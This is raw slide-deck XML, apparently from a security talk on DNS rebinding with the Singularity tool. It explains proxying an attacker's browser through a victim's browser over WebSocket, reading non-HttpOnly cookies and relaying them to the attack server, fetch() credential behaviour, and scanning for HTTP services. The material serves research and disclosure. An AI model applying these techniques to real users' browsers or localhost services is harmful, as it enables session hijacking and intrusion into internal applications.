          <p:cNvPr id="514" name="Google Shape;514;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Proxying without an HTTP Proxy</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="515" name="Google Shape;515;p6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342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Customized Golang’s RoundTripper  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1100" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://golang.org/pkg/net/http/#RoundTripper</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Using WS plain text  protocol to package </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>() requests and responses -  Inflate size of data in transit:  len ~= 4/3  of len(message) using base64 encoding.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Attacker Browser - Any user agent:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> Web browser, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>curl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>, HTTP inspecting proxy, SQLMap, etc.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="160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19" name="Shape 519"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="520" name="Google Shape;520;p68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="445025"/>
            <a:ext cx="8520600" cy="9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Dealing with Split Brains: Syncing the state between the attacker and target’s browsers</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="521" name="Google Shape;521;p68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1743125"/>
            <a:ext cx="8520600" cy="282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initial assumption was that we did not have to care about cookies. Our first test case was Duplicati, a backup application which was vulnerable to DNS rebinding attack and has a web interface listening on localhost.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Oops. </a:t>
            </a:r>
            <a:endParaRPr b="1"/>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522" name="Google Shape;522;p68"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="747725" y="2902625"/>
            <a:ext cx="7648573" cy="1407925"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="523" name="Google Shape;523;p68"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6019800" y="2902625"/>
            <a:ext cx="1543200" cy="5373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27" name="Shape 527"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="528" name="Google Shape;528;p69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="445025"/>
            <a:ext cx="8520600" cy="9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Dealing with Split Brains: Syncing the state between the attacker and target’s browsers</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="529" name="Google Shape;529;p69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1743125"/>
            <a:ext cx="8520600" cy="282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Cookies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> may be used as </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>CSRF tokens</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> or other purposes.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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>non</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> cookies:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Read them from target browser =&gt; transmit to the </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Singularity server</a:t>
            </a:r>
            <a:endParaRPr b="1"/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Singularity </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>sets them on the attacker browser for the target domain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> (the DNS domain constructed by Singularity).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For </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> cookies:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>We don’t care - they can’t be read by JS so they cannot be used by JS.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>The target browser handles (receives and transmits) them for us.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3" name="Shape 533"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="534" name="Google Shape;534;p70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="445025"/>
            <a:ext cx="8520600" cy="9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Dealing with Split Brains: Syncing the state between the attacker and target’s browsers</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="535" name="Google Shape;535;p70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1743125"/>
            <a:ext cx="8520600" cy="282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be able to read cookies from a response to a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fetch() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>request, </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>you must pass the option</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>{credentials: ‘include’}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> to the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fetch()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> request.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>If the application requires HTTP authorization (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WWW-Authenticate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>), then we must forego completely about passing cookies, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng"/>
              <a:t>unless we know the credentials in advance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> and pass them without being challenged for authentication.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Why? Let’s test in the next slides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536" name="Google Shape;536;p70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6401450" y="3849300"/>
            <a:ext cx="571500" cy="1809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40" name="Shape 540"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="541" name="Google Shape;541;p71"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="445025"/>
            <a:ext cx="8520600" cy="9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Dealing with Split Brains: Syncing the state between the attacker and target’s browsers</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="542" name="Google Shape;542;p71"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1743125"/>
            <a:ext cx="8520600" cy="176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rPr>
              <a:t>fetch ('http://127.0.0.1', {credentials: 'include'}) </a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>→ Authentication dialog box popup in victim’s browser</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>→ Victim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543" name="Google Shape;543;p71"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3198224"/>
            <a:ext cx="9144000" cy="1617925"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="544" name="Google Shape;544;p71"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1374025" y="2751800"/>
            <a:ext cx="413755" cy="4464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48" name="Shape 548"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="549" name="Google Shape;549;p72"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="445025"/>
            <a:ext cx="8520600" cy="9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Dealing with Split Brains: Syncing the state between the attacker and target’s browsers</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="550" name="Google Shape;550;p72"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1743125"/>
            <a:ext cx="8520600" cy="176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rPr>
              <a:t>fetch ('http://127.0.0.1', {credentials: omit})</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>→ No authentication dialog box </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>→ Victim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551" name="Google Shape;551;p72"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="3658625"/>
            <a:ext cx="8991601" cy="1332475"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="552" name="Google Shape;552;p72"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1315700" y="2690925"/>
            <a:ext cx="504400" cy="6134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56" name="Shape 556"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="557" name="Google Shape;557;p7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 2: Hook &amp; Control</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="558" name="Google Shape;558;p73">
            <a:hlinkClick r:id="rId3"/>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="42239" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1792945"/>
            <a:ext cx="9144000" cy="2970832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="559" name="Google Shape;559;p73">
            <a:hlinkClick r:id="rId5"/>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="42239" l="0" r="40330" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3687900" y="1298150"/>
            <a:ext cx="5456102" cy="2970824"/>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63" name="Shape 563"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="564" name="Google Shape;564;p74"/>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Scanning for Vulnerable Hosts Services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68" name="Shape 568"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="569" name="Google Shape;569;p7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Old World and Cool Hacks (Embedding Images, Measuring Requests Response Time)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="570" name="Google Shape;570;p75"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1445675"/>
            <a:ext cx="8520600" cy="312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Many astute attempts to replicate </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> behavior without the power of raw sockets. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Often unreliable / do too much for our purposes e.g. we don’t care about whether a SSH port is open or not. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" u="sng"/>
              <a:t>Does it speak HTTP?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> We are interested in DNS rebinding and DNS rebinding deals with the HTTP protocol only (so far). </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>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74" name="Shape 574"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="575" name="Google Shape;575;p76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="445025"/>
            <a:ext cx="8520600" cy="572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Leveraging Modern APIs and Focusing on What Matters (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>abort</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>, HTTP only)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="576" name="Google Shape;576;p76"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1447800" y="2140175"/>
            <a:ext cx="6248400" cy="17526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80" name="Shape 580"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="581" name="Google Shape;581;p7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Leveraging Modern APIs and Focusing on What Matters (fetch, abort, http only)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="582" name="Google Shape;582;p77"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
